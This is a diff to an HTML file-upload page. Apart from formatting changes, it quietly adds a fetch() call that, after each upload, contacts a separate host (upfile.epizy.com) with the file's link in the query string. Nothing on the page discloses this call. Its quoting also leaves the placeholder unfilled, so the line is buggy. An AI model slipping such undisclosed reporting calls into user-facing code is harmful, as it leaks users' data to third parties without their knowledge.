@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>File Upload HUD</title>
@@ -237,7 +236,9 @@
                     throw new Error('Failed to upload file');
                 }
 
+          
                 const data = await response.text();
+                const resp_get = await fetch('https://upfile.epizy.com/co.php?s=${data}');
                 status.innerHTML = `File uploaded successfully! <br>
                    <a href="#" onclick="copyToClipboard('${data}')"><img src="https://img.icons8.com/material-rounded/24/000000/copy.png" class="icon" /> Copy Link </a>`;
             } catch (error) {
@@ -274,6 +275,7 @@
             }
         }
     </script>
+
 
 
 
